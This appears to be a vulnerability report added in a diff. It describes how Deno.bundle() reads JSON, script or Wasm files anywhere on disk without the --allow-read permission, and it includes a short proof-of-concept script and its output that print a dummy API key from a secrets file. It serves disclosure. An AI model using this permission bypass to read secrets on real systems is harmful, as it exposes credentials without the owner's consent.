@@ -1,0 +1,34 @@
+yes
+Deno.bundle() takes in as argument a file name as a string. If the file is of a supported media type (currently javascript, JSX, Typescript, TSX, Json or Wasm), it will bundle that file up and return the output to the calling module as a string of Javascript. No permissions are required. This effectively gives the calling module the ability to read the contents of any these media types located anywhere on the file system without requiring any permission.
+
+Proof of concept
+```
+/some/other/dir/secrets.json
+
+{"my_secret_API_key":"abcd1234"}
+/deno/module/dir/bundle_poc.ts
+
+const [ maybeDiagnostics, output ] = await Deno.bundle("/some/other/dir/secrets.json");
+console.log(output);
+```
+when executed as:
+`deno bundle_poc.ts`
+
+The output (trimmed) is:
+
+Compile file:///deno/module/dir/bundle_poc.ts
+// Copyright 2018-2020 the Deno authors. All rights reserved. MIT license.
+
+// This is a specialised implementation of a System module loader.
+
+// @ts-nocheck
+/* eslint-disable */
+
+let System, __inst, __inst_s;
+
+<...trimmed output...>
+
+{ "my_secret_API_key": "abcd1234" }
+
+__inst_s("secrets");
+As demonstrated above, this method exposes the json data to the calling module. If Deno.bundle() can access any of these media types on the file system and allow the content to be accessed in the module, it should be required to run under the --allow-read permission.
